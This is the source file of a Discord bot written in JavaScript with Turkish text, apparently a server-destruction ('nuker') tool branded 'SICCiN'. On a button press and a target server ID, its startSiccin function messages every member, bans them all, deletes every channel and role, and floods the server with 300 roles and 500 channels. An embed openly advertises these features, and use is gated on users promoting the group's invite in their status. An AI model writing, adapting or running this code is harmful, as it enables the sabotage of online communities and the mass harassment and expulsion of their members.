require("dotenv").config();
const {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  ActivityType,
  PermissionsBitField,
} = require("discord.js");

const fetch = (...args) =>
  import("node-fetch").then(({ default: f }) => f(...args));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

// ENV
const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const WL_KANAL_ID = process.env.WL_KANAL_ID;
const BOT_TOKEN = process.env.BOT_TOKEN;

// ================== DATA ==================
let whitelist = {};
let whitelistMessageId = null;
let cachedVideo = null;

// ================== READY ==================
client.once("ready", async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);

  const videoURL =
    "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";

  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = { attachment: buffer, name: "video.mp4" };
    console.log("🎥 Video cachelendi");
  } catch (e) {
    console.log("❌ Video cachelenemedi");
  }
});

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;
  return member.presence.activities.some(
    (a) =>
      a.type === ActivityType.Custom &&
      a.state &&
      (a.state.includes("/siccin") || a.state.includes(".gg/siccin"))
  );
}

// ================== WHITELIST MESAJ ==================
async function updateWhitelistMessage(channel) {
  let text = "📜 **WHITELIST SUNUCULAR**\n\n";
  for (const id in whitelist) {
    text += `• ${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n`;
  }

  if (whitelistMessageId) {
    const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
    if (msg) return msg.edit({ content: text });
  }

  const msg = await channel.send({ content: text });
  whitelistMessageId = msg.id;
}

// ================== .VNDT PANEL ==================
async function openPanel(message) {
  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

  const embed = new EmbedBuilder()
    .setTitle("⚡ SICCiN PANEL")
    .setDescription("Whitelist sistemi")
    .setColor("Grey");

  const row = new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder()
      .setCustomId("panelMenu")
      .addOptions([{ label: "Whitelist Sistemi", value: "whitelist" }])
  );

  await message.reply({
    embeds: [embed],
    components: [row],
    files: cachedVideo ? [cachedVideo] : [],
  });
}

// ================== SICCiN EMBED ==================
function siccinEmbed(guild) {
  return new EmbedBuilder()
    .setColor("Red")
    .setAuthor({
      name: "ＳＩＣＣＩＮ ABUSE",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setThumbnail(guild.iconURL({ dynamic: true }))
    .setDescription(
      `**Özellikler**\n
• Anında Herkesi Banlar  
• Herkese DM Çeker  
• Tüm Kanal ve Rolleri Siler  
• 500 Kanal & 300 Rol Oluşturur  

**Kullanım**
Botu ekledikten sonra aşağıdaki butona tıkla.`
    )
    .setFooter({ text: "GLORY TO SICCiN" });
}

// ================== SICCiN DM ==================
function siccinDMEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#5a0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ EJECTED",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setDescription(
      `**ＳＩＣＣＩＮ Tarafından**  
**${guild.name}** sunucusuna el konulmuştur.

#GLORY TO ＳＩＣＣＩＮ
https://discord.gg/siccin`
    );
}

// ================== SICCiN İŞLEM ==================
async function startSiccin(interaction, guildId) {
  const guild = client.guilds.cache.get(guildId);
  if (!guild)
    return interaction.reply({ content: "❌ Bot bu sunucuda yok", ephemeral: true });

  if (whitelist[guildId])
    return interaction.reply({ content: "⚠️ Sunucu whitelist'te", ephemeral: true });

  await interaction.reply({ content: "🔥 SICCiN BAŞLATILDI", ephemeral: true });

  const members = await guild.members.fetch();

  for (const m of members.values()) {
    if (m.user.bot) continue;
    await m.send({ embeds: [siccinDMEmbed(guild)] }).catch(() => {});
    await m.ban({ reason: "SICCiN" }).catch(() => {});
  }

  for (const c of guild.channels.cache.values()) {
    await c.delete().catch(() => {});
  }

  for (const r of guild.roles.cache.values()) {
    if (r.managed) continue;
    await r.delete().catch(() => {});
  }

  for (let i = 0; i < 300; i++) {
    await guild.roles.create({ name: "ＳＩＣＣＩＮ 🔱" }).catch(() => {});
  }

  for (let i = 0; i < 500; i++) {
    await guild.channels
      .create({
        name: "ＳＩＣＣＩＮ 🔱",
        type: 0,
      })
      .catch(() => {});
  }
}

// ================== INTERACTIONS ==================
client.on("interactionCreate", async (interaction) => {
  if (interaction.isButton() && interaction.customId === "siccinStart") {
    const modal = new ModalBuilder()
      .setCustomId("siccinModal")
      .setTitle("Hedef Sunucu ID");

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("guildID")
          .setLabel("Hedef Sunucu ID")
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      )
    );

    return interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
    const member = await interaction.guild.members.fetch(interaction.user.id);
    if (!hasSiccinStatus(member))
      return interaction.reply({
        content: "❌ Durumunda /siccin veya .gg/siccin yok",
        ephemeral: true,
      });

    const gid = interaction.fields.getTextInputValue("guildID");
    return startSiccin(interaction, gid);
  }
});

// ================== MESSAGE COMMANDS ==================
client.on("messageCreate", async (message) => {
  if (!message.guild || message.author.bot) return;

  const cmd = message.content.toLowerCase();

  if (cmd === ".vndt") return openPanel(message);

  if (cmd === ".siccin") {
    if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

    const embed = siccinEmbed(message.guild);
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("siccinStart")
        .setLabel("ＳＩＣＣＩＮ")
        .setStyle(ButtonStyle.Secondary)
    );

    return message.channel.send({ embeds: [embed], components: [row] });
  }
});

client.login(BOT_TOKEN);
